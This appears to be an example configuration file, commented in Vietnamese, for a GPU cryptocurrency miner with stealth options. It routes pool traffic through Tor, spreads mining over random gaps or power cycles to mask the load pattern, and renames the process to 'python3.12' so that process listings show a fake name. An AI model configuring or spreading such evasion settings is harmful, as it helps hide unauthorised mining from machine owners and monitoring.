# =============================================================================
# config.example.sh — Copy thành config.sh và điền thông tin của bạn
# =============================================================================
# Copy: cp config.example.sh config.sh
# Sau đó edit config.sh

# ── Miner ────────────────────────────────────────────────────────────────────
ALGO="pearlhash"           # pearlhash, dynex, xelishashv3, qhash, quantus, poseidon2b, cryptix_ox8, zilliqa
WALLET="YOUR_WALLET_ADDRESS"
WORKER="rig01"
POOL="stratum+ssl://pool.example.com:4444"  # Pool URL

# ── Network ──────────────────────────────────────────────────────────────────
USE_TOR=1                  # 1 = dùng Tor, 0 = direct
SOCKS_ADDR="127.0.0.1:9050"
PROXY_LISTEN="127.0.0.1:3333"

# ── Load pattern ─────────────────────────────────────────────────────────────
USE_SCHEDULER=1            # 1 = dùng load scheduler, 0 = mine liên tục
STRATEGY="random-gaps"     # random-gaps, power-cycle, sine

# random-gaps
MINE_MIN=30                # phút
MINE_MAX=120               # phút
PAUSE_MIN=2                # phút
PAUSE_MAX=15               # phút

# power-cycle
HIGH_W=250                 # Watt
LOW_W=120                  # Watt

# ── Disguise ─────────────────────────────────────────────────────────────────
DISGUISE_PROC="python3.12" # Tên process giả (ps sẽ hiện tên này)
